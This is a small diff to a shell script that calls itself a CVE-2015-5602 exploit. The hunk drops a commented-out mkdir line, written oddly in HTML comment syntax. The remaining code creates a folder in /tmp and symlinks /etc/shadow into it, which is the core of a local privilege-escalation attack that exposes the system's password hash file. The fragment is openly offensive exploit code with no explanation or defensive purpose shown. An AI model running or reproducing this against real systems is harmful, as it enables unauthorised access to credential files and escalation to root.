@@ -19,7 +19,6 @@ EOF
 main() {
 	printf "[+] CVE-2015-5602 exploit by t0kx\n"
 	printf "[+] Creating folder...\n"
-	<!-- mkdir -p /home/${USER}/${FOLDER}/ -->
 	mkdir -p /tmp/${USER}/${FOLDER}/
 	printf "[+] Creating symlink\n"
 	ln -sf /etc/shadow /tmp/${USER}/${FOLDER}/esc.txt
